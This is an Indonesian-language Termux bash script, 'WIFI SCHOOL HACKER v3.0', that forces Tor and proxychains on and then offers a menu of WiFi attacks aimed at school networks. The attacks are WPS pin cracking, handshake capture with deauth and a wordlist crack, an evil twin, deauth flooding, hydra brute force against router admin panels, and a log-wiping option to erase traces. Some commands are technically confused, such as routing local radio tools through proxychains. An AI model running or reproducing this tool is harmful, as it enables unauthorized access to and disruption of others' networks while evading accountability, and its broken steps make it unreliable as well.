#!/data/data/com.termux/files/usr/bin/bash

# Warna keren
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ============================================
# 🎭 VPN CHECK & ACTIVATION - WAJIB DULUAN!
# ============================================

clear
echo -e "${PURPLE}"
echo "╔════════════════════════════════════════╗"
echo "║   NESIA DARKNET - VPN FIRST SYSTEM     ║"
echo "║    NO VPN = NO HACKING 😈              ║"
echo "╚════════════════════════════════════════╝${NC}"
echo ""

vpn_activation() {
    echo -e "${YELLOW}[+] CHECKING VPN CONNECTION...${NC}"
    
    # Cek apakah TOR sudah terinstall
    if ! command -v tor &> /dev/null; then
        echo -e "${RED}[!] TOR belum terinstall!${NC}"
        echo -e "${GREEN}[+] Installing TOR & Proxy Chains...${NC}"
        pkg install tor proxychains-ng -y
    fi
    
    # Start TOR service
    echo -e "${YELLOW}[+] Starting TOR VPN Service...${NC}"
    tor &
    sleep 5
    
    # Cek koneksi TOR
    echo -e "${CYAN}[+] Testing VPN anonymity...${NC}"
    vpn_check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org | grep -o "Congratulations")
    
    if [ "$vpn_check" = "Congratulations" ]; then
        echo -e "${GREEN}[✓] VPN TOR AKTIF! IP Tersembunyi 😎${NC}"
        echo -e "${BLUE}[+] IP Publik kamu sekarang:${NC}"
        curl --socks5-hostname localhost:9050 -s https://api.ipify.org
        echo ""
        echo -e "${GREEN}[+] VPN Protocol: SOCKS5 Port 9050${NC}"
        echo -e "${GREEN}[+] Country: Hidden 🇺🇳${NC}"
        return 0
    else
        echo -e "${RED}[✗] VPN GAGAL DIHIDUPKAN!${NC}"
        echo -e "${YELLOW}[+] Mencoba metode alternatif...${NC}"
        
        # Metode alternatif: Proxychains
        echo -e "${CYAN}[+] Menggunakan ProxyChains...${NC}"
        pkg install proxychains-ng -y
        
        # Setup proxychains config
        echo "socks5 127.0.0.1 9050" > $PREFIX/etc/proxychains.conf
        echo "socks5 127.0.0.1 9150" >> $PREFIX/etc/proxychains.conf
        echo "http 127.0.0.1 8080" >> $PREFIX/etc/proxychains.conf
        
        # Test dengan proxychains
        if proxychains curl -s https://api.ipify.org &> /dev/null; then
            echo -e "${GREEN}[✓] PROXYCHAINS AKTIF!${NC}"
            return 0
        else
            echo -e "${RED}[✗] SEMUA VPN GAGAL!${NC}"
            echo -e "${YELLOW}[+] Tool akan mati dalam 5 detik...${NC}"
            sleep 5
            exit 1
        fi
    fi
}

# ============================================
# 🛡️ ANONYMITY CHECK SETIAP 2 MENIT
# ============================================

anonymity_monitor() {
    while true; do
        sleep 120  # Cek setiap 2 menit
        
        vpn_check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org | grep -o "Congratulations")
        
        if [ "$vpn_check" != "Congratulations" ]; then
            echo -e "${RED}[⚠] VPN TERDETEKSI MATI!${NC}"
            echo -e "${YELLOW}[+] Restarting VPN...${NC}"
            pkill tor
            tor &
            sleep 3
            
            # Jika masih gagal, warning
            vpn_check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org | grep -o "Congratulations")
            if [ "$vpn_check" != "Congratulations" ]; then
                echo -e "${RED}[‼] VPN TIDAK BISA DIPULIHKAN!${NC}"
                echo -e "${RED}[‼] TOOL AKAN DIMATIKAN OTOMATIS!${NC}"
                pkill -f "wifi_school_vpn.sh"
                exit 1
            fi
        fi
    done
}

# ============================================
# 🚀 EKSEKUSI VPN DULU!
# ============================================

echo -e "${RED}[‼] PERINGATAN:${NC}"
echo -e "${YELLOW}[+] Tool ini ILLEGAL tanpa VPN!${NC}"
echo -e "${CYAN}[+] VPN akan diaktifkan otomatis...${NC}"
echo ""

# Jalankan VPN check
vpn_activation

# Jalankan monitor VPN di background
anonymity_monitor &

# ============================================
# 🖥️ MAIN HACKING TOOL SETELAH VPN AKTIF
# ============================================

clear
echo -e "${GREEN}"
echo "╔════════════════════════════════════════╗"
echo "║   WIFI SCHOOL HACKER v3.0             ║"
echo "║   VPN STATUS: ✅ AKTIF                 ║"
echo "║   ANONYMITY: 100% TERJAGA 😎          ║"
echo "╚════════════════════════════════════════╝${NC}"
echo ""
echo -e "${PURPLE}[+] All traffic melalui TOR Network!${NC}"
echo -e "${PURPLE}[+] ISP tidak bisa lacak aktivitas!${NC}"
echo ""

# Function jalankan dengan VPN
run_with_vpn() {
    proxychains "$@"
}

# Install tools via VPN
echo -e "${YELLOW}[+] Installing tools via VPN...${NC}"
run_with_vpn pkg update -y
run_with_vpn pkg install -y aircrack-ng hydra macchanger reaver bully wireshark tcpdump

# Main hacking function
start_hacking() {
    echo -e "${RED}[+] WIFI HACKING MODE AKTIF!${NC}"
    
    # Enable monitor mode via VPN
    run_with_vpn airmon-ng check kill
    run_with_vpn airmon-ng start wlan0
    
    # Scan WiFi dengan VPN
    echo -e "${CYAN}[+] Scanning WiFi networks via VPN...${NC}"
    run_with_vpn airodump-ng wlan0mon --output-format csv -w vpn_scan
    
    echo -e "${GREEN}[+] SCAN BERHASIL!${NC}"
    echo ""
    
    # Tampilkan menu
    echo -e "${BLUE}╔══════════════════════════════════╗${NC}"
    echo -e "${BLUE}║         ATTACK METHODS           ║${NC}"
    echo -e "${BLUE}╠══════════════════════════════════╣${NC}"
    echo -e "${BLUE}║ 1. WPS Pin Attack (via VPN)     ║${NC}"
    echo -e "${BLUE}║ 2. Handshake Capture (via VPN)  ║${NC}"
    echo -e "${BLUE}║ 3. Evil Twin (via VPN)          ║${NC}"
    echo -e "${BLUE}║ 4. Deauth Attack (via VPN)      ║${NC}"
    echo -e "${BLUE}║ 5. Router Admin Brute (via VPN) ║${NC}"
    echo -e "${BLUE}║ 6. Check VPN Status             ║${NC}"
    echo -e "${BLUE}║ 7. Exit & Clean Logs            ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════╝${NC}"
    echo ""
    
    read -p "Pilih attack [1-7]: " attack_choice
    
    case $attack_choice in
        1)
            echo -e "${RED}[+] Starting WPS Attack via VPN...${NC}"
            read -p "Masukkan BSSID target: " target_bssid
            run_with_vpn reaver -i wlan0mon -b $target_bssid -vv -K 1
            ;;
        2)
            echo -e "${RED}[+] Capturing Handshake via VPN...${NC}"
            read -p "Masukkan BSSID target: " target_bssid
            read -p "Masukkan Channel: " target_channel
            
            # Deauth via VPN
            run_with_vpn aireplay-ng -0 10 -a $target_bssid wlan0mon &
            
            # Capture via VPN
            run_with_vpn airodump-ng -c $target_channel --bssid $target_bssid -w vpn_handshake wlan0mon
            
            # Bruteforce via VPN
            echo -e "${YELLOW}[+] Downloading wordlist via VPN...${NC}"
            run_with_vpn wget https://github.com/example/school-passwords/raw/main/list.txt
            
            run_with_vpn aircrack-ng -w list.txt -b $target_bssid vpn_handshake-01.cap
            ;;
        3)
            echo -e "${RED}[+] Evil Twin via VPN...${NC}"
            run_with_vpn git clone https://github.com/example/evil-twin-vpn.git
            cd evil-twin-vpn
            run_with_vpn python3 evil_twin.py
            ;;
        4)
            echo -e "${RED}[+] Deauth Attack via VPN...${NC}"
            read -p "Masukkan BSSID target: " target_bssid
            run_with_vpn aireplay-ng -0 100 -a $target_bssid wlan0mon
            ;;
        5)
            echo -e "${RED}[+] Router Admin Brute via VPN...${NC}"
            echo -e "${YELLOW}[+] Common school router IPs:${NC}"
            echo "192.168.1.1"
            echo "192.168.0.1"
            echo "10.0.0.1"
            
            read -p "Masukkan router IP: " router_ip
            run_with_vpn hydra -l admin -P list.txt $router_ip http-post-form
            ;;
        6)
            echo -e "${GREEN}[+] VPN STATUS CHECK${NC}"
            run_with_vpn curl https://check.torproject.org
            ;;
        7)
            echo -e "${YELLOW}[+] Cleaning semua logs...${NC}"
            run_with_vpn rm -f *.cap *.csv *.txt *.log
            run_with_vpn airmon-ng stop wlan0mon
            echo -e "${GREEN}[+] Semua jejak dihapus!${NC}"
            pkill tor
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Pilihan salah!${NC}"
            ;;
    esac
}

# Loop utama
while true; do
    start_hacking
    echo ""
    read -p "Tekan Enter untuk kembali ke menu..."
    clear
done